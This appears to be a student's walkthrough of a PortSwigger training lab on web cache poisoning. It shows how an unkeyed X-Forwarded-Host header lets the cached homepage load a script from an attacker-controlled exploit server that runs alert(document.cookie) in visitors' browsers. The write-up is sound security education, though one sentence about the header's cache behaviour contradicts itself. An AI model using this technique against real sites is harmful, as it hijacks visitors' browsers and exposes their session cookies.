# [Web cache poisoning with an unkeyed header](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-header)

- This lab handles unkeyed header in an unsafe way, poison the cache with a response that executes `alert(document.cookie)` in the visitor's browser.

## recon

- open the lab in burp browser
- send the `/` request to repeater
- send it again
- the `X-Cache: miss` changes to `X-Cache: hit`
- it caches the response

---

**use a cachebuster to make the exploit testing only for you**
`/?qwe=asd`

---

- start a Param Miner (extension) on the request to check what headers might be exploitable
- `Extensions` -> `Param Miner` -> `Guess Headers`
- it will give back the `X-Forwarded-Host`
- `X-Forwarded-Host` is unkeyed, so if that changes the cachekey will not change, so any exploit with `X-Forwarded-Host` will not stay in the cache

## exploit setup

- add the exploit server to the `X-Forwarded-Host`

```
GET /?qwe=asd HTTP/2
...
X-Forwarded-Host: exploit-...-server.net
```

- in the response there will be the added exploit server

```
...
<script type="text/javascript" src="//exploit-...-server.net/resources/js/tracking.js">
...
```

- change the exploit file to `/resources/js/tracking.js`
- add the body an `alert` -> `alert(1)`
- store the exploit
- go back to the page and add the url the `/?qwe=asd`
- reload the page
- it should give an `alert` what means it works

- now, to solve the lab in the repeater send the request without the `?qwe=asd`
- aka send only as `/`
- in the exploit server add the `alert(document.cookie)` to the body and store it
- send the request in the repeater again
- if the lab is not solved try to resend it couple times
- you can check on your home page if the exploit work (without the `?qwe=asd`)
